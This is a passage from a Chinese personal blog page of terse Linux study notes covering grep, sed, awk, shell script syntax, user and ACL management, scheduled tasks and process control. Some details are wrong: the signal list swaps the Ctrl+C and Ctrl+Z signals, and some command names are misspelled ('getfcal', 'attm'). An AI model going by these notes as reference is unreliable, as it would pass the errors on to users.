<li><h2 id="划分命令-split"><a href="#划分命令-split" class="headerlink" title="划分命令 split"></a>划分命令 split</h2></li>
<li><p>$?也是变量，在linux中返回0表示成功</p>
</li>
</ol>
<h1 id="正则表达式与文件格式化处理"><a href="#正则表达式与文件格式化处理" class="headerlink" title="正则表达式与文件格式化处理"></a>正则表达式与文件格式化处理</h1><ol>
<li><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2></li>
</ol>
<p>​       digit   代表数字 0-9</p>
<p>​       upper  大写字母   lower 小写字母</p>
<p>​       grep -i 忽略大小写 -n 输出行号 -v反向选择 </p>
<ol start="2">
<li><h2 id="基础正则表达式字符集合（characters）"><a href="#基础正则表达式字符集合（characters）" class="headerlink" title="基础正则表达式字符集合（characters）"></a>基础正则表达式字符集合（characters）</h2></li>
</ol>
<p>​       ctrl     [ctrl]    *    .    [-]    $ </p>
<ol start="3">
<li><h2 id="sed工具"><a href="#sed工具" class="headerlink" title="sed工具"></a>sed工具</h2></li>
</ol>
<p>​       sed [-nefr] [操作]</p>
<p>​       -n 使用安静模式 -e直接在命名行模式进行sed操作 -i 直接修改读取文件内容</p>
<p>​       操作说明 n1 n2 function ，n1 n2表示行数   $代表最后一行</p>
<p>​       a 新增 c 替换 d 删除 i 插入 p 打印 s 替换</p>
<ol start="4">
<li><h2 id="格式化打印"><a href="#格式化打印" class="headerlink" title="格式化打印"></a>格式化打印</h2></li>
</ol>
<p>​       printf </p>
<ol start="5">
<li><h2 id="awk-数据处理工具"><a href="#awk-数据处理工具" class="headerlink" title="awk 数据处理工具"></a>awk 数据处理工具</h2></li>
</ol>
<p>​      NF 每一行字段总数 </p>
<p>​      NR 目前awk所处理的第几行数据</p>
<p>​      FS 分隔字符。默认是空格键</p>
<h1 id="学习shell脚本"><a href="#学习shell脚本" class="headerlink" title="学习shell脚本"></a>学习shell脚本</h1><ol>
<li><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2></li>
</ol>
<p>​      第一行声明shell名称</p>
<p>​      !&#x2F;bin&#x2F;bash</p>
<p>​      简单的shell脚本 </p>
<p>​      计算式    $((计算式))</p>
<p>​      sh 执行脚本并不会在父进程生效</p>
<p>​      source 执行脚本会在父进程生效</p>
<ol start="2">
<li><h2 id="用test命令的测试功能"><a href="#用test命令的测试功能" class="headerlink" title="用test命令的测试功能"></a>用test命令的测试功能</h2></li>
</ol>
<p>​      test -e 测试文件是否存在 -f 该文件名是否存在且文件 -d 该文件名是否存在且为目录</p>
<ol start="3">
<li><h2 id="if-then-判断"><a href="#if-then-判断" class="headerlink" title="if  .then 判断"></a>if  .then 判断</h2></li>
</ol>
<p>​      &amp;&amp;表示and</p>
<p>​      || 表示or</p>
<p>​      if 条件判断 ；then</p>
<p>​      elif</p>
<p>​      else</p>
<p>​      fi（结束之意）</p>
<ol start="4">
<li><h2 id="case-esac判断"><a href="#case-esac判断" class="headerlink" title="case esac判断"></a>case esac判断</h2></li>
</ol>
<p>​     case $变量名称  in </p>
<p>​     “第一个变量内容”) （关键字为右圆括号）</p>
<p>​     程序段   </p>
<p>​     ；；(结尾用两个连续的分号处理)</p>
<p>​     “第二个变量内容”) （</p>
<p>​      程序段   </p>
<p>​      ；；</p>
<p>​      * ）（最后一个变量的值会用*表示其他所有值）</p>
<p>​     exit1</p>
<p>​     ;;  </p>
<p>​     esac 最终以esac结尾</p>
<ol start="5">
<li><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2></li>
</ol>
<p>​      function fname（）{</p>
<p>​      程序段</p>
<p>​      }</p>
<ol start="6">
<li><h2 id="loop-循环"><a href="#loop-循环" class="headerlink" title="loop 循环"></a>loop 循环</h2></li>
</ol>
<p>​       while do done 和 until do done</p>
<p>​       while [判断式]  判断成功则开始循环      until [判断式]  当判断成立就终止循环</p>
<p>​       do 循环开始                                              do 循环开始</p>
<p>​       程序段落                                                    程序段落</p>
<p>​       done 循环结束                                          done 循环结束</p>
<ol start="7">
<li><h2 id="固定循环-for-do-done"><a href="#固定循环-for-do-done" class="headerlink" title="固定循环  for do done"></a>固定循环  for do done</h2></li>
</ol>
<p>​        for var  in  con1 con2 con3</p>
<p>​        do   </p>
<p>​        程序段</p>
<p>​        done </p>
<p>​        第一次循环 $var 的值为con1</p>
<p>​        …..</p>
<h1 id="linux账号管理与ACL权限设置"><a href="#linux账号管理与ACL权限设置" class="headerlink" title="linux账号管理与ACL权限设置"></a>linux账号管理与ACL权限设置</h1><ol>
<li><h2 id="用户标识符uid与gid"><a href="#用户标识符uid与gid" class="headerlink" title="用户标识符uid与gid"></a>用户标识符uid与gid</h2></li>
</ol>
<p>​        id与账号对应在&#x2F;etc&#x2F;passwd里面</p>
<p>​        uid 用户id  gid 用户组id</p>
<p>​        用户登录后，获取shell 在&#x2F;sbin&#x2F;nologin</p>
<ol start="2">
<li><p>&#x2F;etc&#x2F;shadow 一共有9个字段</p>
</li>
<li><p>&#x2F;etc&#x2F;group 与 &#x2F;etc&#x2F;gshadow</p>
</li>
<li><p>有效用户组与初始用户组</p>
</li>
</ol>
<p>​        newgrp ：有效用户组切换</p>
<ol start="5">
<li><h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2></li>
</ol>
<p>​        useradd 新增用户 （默认建立家目录后，权限为700）</p>
<p>​        -g 初始用户组 -u 设置初始uid   -r 建立系统账号（uid会有限制，系统账号不会默认建立家目录）</p>
<p>​        userdel 删除用户</p>
<p>​        -r 连同家目录一起删除</p>
<p>​         passwd 修改密码</p>
<ol start="6">
<li><h2 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h2>groupadd 新增用户组</li>
</ol>
<p>​       groupdel  删除用户组</p>
<p>​       gpasswd  用户组管理员功能</p>
<p>​       -A 设置用户组管理员</p>
<ol start="7">
<li><h2 id="主机详细权限规划-ACL的使用"><a href="#主机详细权限规划-ACL的使用" class="headerlink" title="主机详细权限规划  ACL的使用"></a>主机详细权限规划  ACL的使用</h2></li>
</ol>
<p>​       getfcal 获取某个文件或目录的acl设置选项</p>
<p>​       setfacl 设置某个文件或目录acl规范</p>
<p>​       设置规范 u:[使用者账号列表]:rwx </p>
<ol start="8">
<li><h2 id="用户身份切换"><a href="#用户身份切换" class="headerlink" title="用户身份切换"></a>用户身份切换</h2></li>
</ol>
<p>​        su 身份切换命令  执行一次命令 su - -c 命令串</p>
<p>​        sudo 身份切换命令 （必须在&#x2F;etc&#x2F;sudoers内的用户才能执行sudo命令）</p>
<ol start="9">
<li><h2 id="特殊shell"><a href="#特殊shell" class="headerlink" title="特殊shell"></a>特殊shell</h2></li>
</ol>
<p>​       &#x2F;sbin&#x2F;nologin</p>
<p>  10 .PAM 用户验证模块，判断密码是否在字典里面</p>
<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><ol>
<li><h2 id="at"><a href="#at" class="headerlink" title="at"></a>at</h2></li>
</ol>
<p>​       执行一次命令    写入&#x2F;var&#x2F;spool&#x2F;at目录中</p>
<p>​       at +time +命令</p>
<p>​       atq 查询at命令   attm 删除at命令</p>
<ol start="2">
<li><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2></li>
</ol>
<p>​       循环执行命令</p>
<p>​       -e 编辑crontab的内容 -l 查看 -r 删除</p>
<h1 id="进程管理与SELinux初探"><a href="#进程管理与SELinux初探" class="headerlink" title="进程管理与SELinux初探"></a>进程管理与SELinux初探</h1><ol>
<li><p>在执行命令的后面加上 &amp; 就会在后台中进行</p>
</li>
<li><p>将目前任务丢到后台中暂停【ctrl+z】</p>
</li>
<li><p>查看后台状态任务 jobs</p>
</li>
<li><p>将后台任务拿到前台来处理 fg</p>
</li>
<li><p>让任务在后台丢到状态变成运行中 bg</p>
</li>
<li><p>删除任务 kill</p>
</li>
<li><p>查看进程 ps  -l 只查看与自己相关的进程</p>
</li>
<li><p>top 查看进程的动态变化</p>
</li>
<li><p>信号 1 启动终止的进程 2 相当于输入ctrl+z中断一个进程</p>
</li>
</ol>
<p>​       9 强制中断进程  15 正常的中断一个进程   19 相当于crrl+c 暂停一个进程</p>
<ol start="10">
<li>查看内存使用情况 free</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="春去春来"
      src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
  <p class="site-author-name" itemprop="name">春去春来</p>
  <div class="site-description" itemprop="description">登峰造极境</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Sat Aug 27 2022 08:00:00 GMT+0800 (中国标准时间) – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">春去春来</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


</body>
</html>
